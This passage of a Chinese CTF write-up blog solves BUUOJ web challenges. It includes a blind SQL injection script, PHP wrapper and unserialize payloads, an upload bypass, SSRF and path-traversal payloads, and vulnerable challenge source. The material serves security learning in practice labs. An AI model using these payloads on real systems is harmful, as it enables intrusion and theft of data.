title="0X09：[WUSTCTF2020]颜值成绩查询"></a>0X09：[WUSTCTF2020]颜值成绩查询</h4><p>盲注，直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://7e100a65-2a28-4468-bd32-37a4f7d7bf17.node3.buuoj.cn/?stunum=1"</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = left + ((right - left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='ctf'),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        payload = <span class="string">"^(ascii(substr((select(value)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)"</span>.format(i,mid)</span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">            print(<span class="string">'too fast'</span>)</span><br><span class="line">            time.sleep(<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hi admin, your score is: 100'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'Hi admin, your score is: 100'</span>  <span class="keyword">in</span> r.text:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = left + ((right-left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += chr(mid)</span><br><span class="line">    print(str(mid),res)</span><br></pre></td></tr></table></figure><p>不知道什么原因，每次出来的flag都不一样，先放着了，思路没问题，用异或注入</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0X01：-网鼎杯-2020-青龙组-AreUSerialz&quot;&gt;&lt;a href=&quot;#0X01：-网鼎杯-2020-青龙组-AreUSerialz&quot; class=&quot;headerlink&quot; title=&quot;0X01：[网鼎杯 2020 青龙组]AreUSerialz&quot;&gt;&lt;/a&gt;0X01：[网鼎杯 2020 青龙组]AreUSerialz
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>buuoj2</title>
    <link href="http://yoursite.com/2020/05/11/buuoj2/"/>
    <id>http://yoursite.com/2020/05/11/buuoj2/</id>
    <published>2020-05-11T15:08:46.000Z</published>
    <updated>2020-05-17T06:23:13.755Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0X01-ZJCTF-2019-NiZhuanSiWei"><a href="#0X01-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="0X01:[ZJCTF 2019]NiZhuanSiWei"></a>0X01:[ZJCTF 2019]NiZhuanSiWei<a id="more"></a></h4><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>pass1:</p><p>用data协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/1.png" class="" title="examplename"><p>pass2：</p><p>用filter协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure><p>拿到base64加密的源码，解密，是个简单的序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=<span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;file=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);<span class="comment">//让file=flag.php即可</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/2.png" class="" title="examplename"><h4 id="0X02-ACTF2020-新生赛-Include"><a href="#0X02-ACTF2020-新生赛-Include" class="headerlink" title="0X02:[ACTF2020 新生赛]Include"></a>0X02:[ACTF2020 新生赛]Include</h4><p>打开题目，有一个跳转链接，点击</p><img src="/2020/05/11/buuoj2/4.png" class="" title="examplename"><p>直接用filter读取flag.php</p><img src="/2020/05/11/buuoj2/3.png" class="" title="examplename"><p>base64解密就能拿到flag</p><h4 id="0X03-ACTF2020-新生赛-Upload"><a href="#0X03-ACTF2020-新生赛-Upload" class="headerlink" title="0X03:[ACTF2020 新生赛]Upload"></a>0X03:[ACTF2020 新生赛]Upload</h4><p>查看网页源码，有js前端验证，直接去掉</p><p>上传一个php文件，提示只能上传图片文件</p><p>尝试后缀绕过，phtml成功上传，连上蚁剑，拿到flag</p><img src="/2020/05/11/buuoj2/5.png" class="" title="examplename"><p>从拿到的源码可以看到考点就是phtml</p><h4 id="0X04-De1CTF-2019-SSRF-Me"><a href="#0X04-De1CTF-2019-SSRF-Me" class="headerlink" title="0X04:[De1CTF 2019]SSRF Me"></a>0X04:[De1CTF 2019]SSRF Me</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>在/De1ta页面我们get方法传入param参数值，在cookie里面传递action和sign的值,将传递的param通过waf这个函数,waf函数过滤了以file和gopher开头的，传参构造Task类，调用exec方法，checkSign验证登录</p><img src="/2020/05/11/buuoj2/6.png" class="" title="examplename"><p>上面的分析可以知道，action=readscan或者scanread</p><img src="/2020/05/11/buuoj2/8.png" class="" title="examplename"><p>当我们传入的参数action和param经过getSign这个函数之后与sign相等，就返回true</p><p>返回true之后则进入if语句里面</p><img src="/2020/05/11/buuoj2/7.png" class="" title="examplename"><p>需要secert_key+param+action三个字符串连接起来之后进行md5加密作为返回值</p><p>调用geneSign路由可以拿到secret_key，再给param传值，param=flag.txtread,得到需要的MD5值</p><img src="/2020/05/11/buuoj2/10.png" class="" title="examplename"><h4 id="0X05-ASIS-2019-Unicorn-shop"><a href="#0X05-ASIS-2019-Unicorn-shop" class="headerlink" title="0X05:[ASIS 2019]Unicorn shop"></a>0X05:[ASIS 2019]Unicorn shop</h4><p>打开是一个购买界面，有四种商品，随便选一个，输入价格</p><img src="/2020/05/11/buuoj2/12.png" class="" title="examplename"><p>只能输入一个字符，看一下源码，找到了点提示</p><img src="/2020/05/11/buuoj2/11.png" class="" title="examplename"><p>用utf-8的编码来购买，价格要大于4号商品的价格，找了一个网站，这里记录一下</p><p><a href="https://www.compart.com/en/unicode/U+2187" target="_blank" rel="noopener">https://www.compart.com/en/unicode/U+2187</a></p><p>搜索一下thousand，找一个字符，修改0x为%即可</p><img src="/2020/05/11/buuoj2/13.png" class="" title="examplename"><h4 id="0X06-GXYCTF2019-禁止套娃"><a href="#0X06-GXYCTF2019-禁止套娃" class="headerlink" title="0X06:[GXYCTF2019]禁止套娃"></a>0X06:[GXYCTF2019]禁止套娃</h4><p>打开题目没什么提示，扫描一发</p><img src="/2020/05/11/buuoj2/14.png" class="" title="examplename"><p>发现了.git泄露，git攻击</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了很多东西，看了别的师傅的wp，说是无参RCE，学习一下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">scandir() 列出 images 目录中的文件和目录。</span><br><span class="line">readfile() 输出一个文件。</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">pos() current() 的别名。</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">array_reverse()以相反的元素顺序返回数组。</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/15.png" class="" title="examplename"><h4 id="0X07-SUCTF-2019-Pythonginx"><a href="#0X07-SUCTF-2019-Pythonginx" class="headerlink" title="0X07:[SUCTF 2019]Pythonginx"></a>0X07:[SUCTF 2019]Pythonginx</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br><span class="line">   </span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure><p>给了源码，找了资料，发现一张很有用的图片</p><img src="/2020/05/11/buuoj2/16.png" class="" title="examplename"><p>从源码中可以看到，url前面部分是suctf.cc,但是源码中进行了替换，所以c可以用c℆代替</p><p>再是有关nginx的</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Nginx配置文件</span><br><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p>payload：file://suctf.c℆sr/local/nginx/conf/nginx.conf，找到flag所在</p><img src="/2020/05/11/buuoj2/17.png" class="" title="examplename"><h4 id="0X08-GWCTF-2019-我有一个数据库"><a href="#0X08-GWCTF-2019-我有一个数据库" class="headerlink" title="0X08:[GWCTF 2019]我有一个数据库"></a>0X08:[GWCTF 2019]我有一个数据库</h4><p>一堆乱码，扫描，发现robots.txt,还找到了phpmyadmin,没有密码直接登录</p><img src="/2020/05/11/buuoj2/18.png" class="" title="examplename"><img src="/2020/05/11/buuoj2/19.png" class="" title="examplename"><p>后续思路附上一篇文章<a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener">https://www.jianshu.com/p/fb9c2ae16d09</a></p><p>payload：?target=db_datadict.php%253f/../../../../../../../../flag</p><img src="/2020/05/11/buuoj2/20.png" class="" title="examplename"><h4 id="0X09-SWPU2019-Web1"><a href="#0X09-SWPU2019-Web1" class="headerlink" title="0X09:[SWPU2019]Web1"></a>0X09:[SWPU2019]Web1</h4><p>虚假登录界面，注册登录有一个发布广告，不是sql就是xss，经过测试应该是sql，测试了挺久没有思路，找了wp，是MariaDB的sql注入</p><img src="/2020/05/11/buuoj2/21.png" class="" title="examplename"><p>过滤了什么自己去测试吧，直接附上payload</p><figure class="highlight sql"><table><tr><td 